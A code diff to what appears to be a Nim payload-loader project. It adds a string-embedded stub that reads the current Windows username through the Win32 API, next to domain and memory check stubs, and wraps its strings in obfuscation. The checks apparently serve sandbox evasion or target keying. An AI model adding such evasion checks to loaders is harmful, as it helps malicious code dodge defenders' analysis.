@@ -82,10 +82,33 @@ proc getDomain*(): string =
   if not success:
       when defined(verbose):
         echo obf("Failed to get Domain")
+  else:
+      when defined(verbose):
+        echo obf("Domain: ") & result
   result.setLen(resultLen)
 
 """
 
+let UsernameCheckStub * = """
+# this function will enumerate the current username via Win32 API
+
+proc getUsername*(): string =
+    var
+        username: string
+        size: DWORD = 0
+    
+    discard GetUserNameA(nil, addr size)
+    username = newString(size)
+    discard GetUserNameA(username.cstring, addr size)
+    when defined(verbose):
+        echo obf("Username: ") & username
+    # remove 0x00 from username
+    username = username[0 ..< size - 1]
+    # make everything lowercase
+    username = username.toLower
+    result = username
+
+"""
 
 let MemorySpaceStub * = """
 
